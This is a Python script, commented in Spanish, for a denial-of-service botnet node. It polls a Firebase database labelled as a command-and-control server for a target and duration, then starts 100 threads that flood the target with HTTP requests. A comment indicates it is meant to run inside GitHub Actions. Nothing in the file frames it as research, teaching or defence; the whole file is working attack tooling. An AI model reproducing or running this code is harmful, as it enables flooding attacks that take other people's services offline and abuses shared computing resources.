import requests, time, threading, random

DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"

def attack(method, target, end_time):
    # Esto hará que el bot sea agresivo
    while time.time() < end_time:
        try:
            requests.get(target, timeout=2, verify=False)
        except:
            pass

def monitor():
    last_stamp = ""
    print("[SYSTEM] Ryxen Neural Node Online...")
    while True:
        try:
            r = requests.get(DB_URL).json()
            if r and r.get('stamp') != last_stamp:
                last_stamp = r['stamp']
                target = r['target'] if r['target'].startswith("http") else f"http://{r['target']}"
                duration = int(r['time'])
                end_time = time.time() + duration
                
                # ESTO ES LO QUE VERÁS EN GITHUB ACTIONS
                print(f"\n[!!!] ORDEN RECIBIDA: {r['method']}")
                print(f"[!] OBJETIVO: {target}")
                print(f"[!] DURACION: {duration}s")
                
                for i in range(100):
                    threading.Thread(target=attack, args=(r['method'], target, end_time), daemon=True).start()
                print(f"[+] 100 Hilos desplegados en este nodo.")
            else:
                # Mensaje de latido para que sepas que NO está colgado
                print("... esperando nueva orden de Firebase ...", end="\r")
        except Exception as e:
            print(f"\n[ERROR] {e}")
        time.sleep(2)

if __name__ == "__main__":
    monitor()
